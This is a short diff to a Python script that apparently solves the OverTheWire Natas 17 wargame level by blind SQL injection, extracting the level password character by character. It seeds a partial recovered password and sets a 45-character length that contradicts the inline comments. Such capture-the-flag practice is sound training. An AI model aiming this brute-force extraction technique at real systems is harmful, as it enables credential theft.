@@ -7,9 +7,9 @@ headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
 u="http://natas17.natas.labs.overthewire.org/index.php?debug"
 
-password="" # start with blank password
+password="6OG1PbKdVjyBRzhRm45678" # start with blank password
 count = 1   # substr() length argument starts at 1
-PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
+PASSWORD_LENGTH = 45  # previous passwords were 32 chars long
 VALID_CHARS = string.digits + string.ascii_letters
 
 while count <= PASSWORD_LENGTH + 1: 
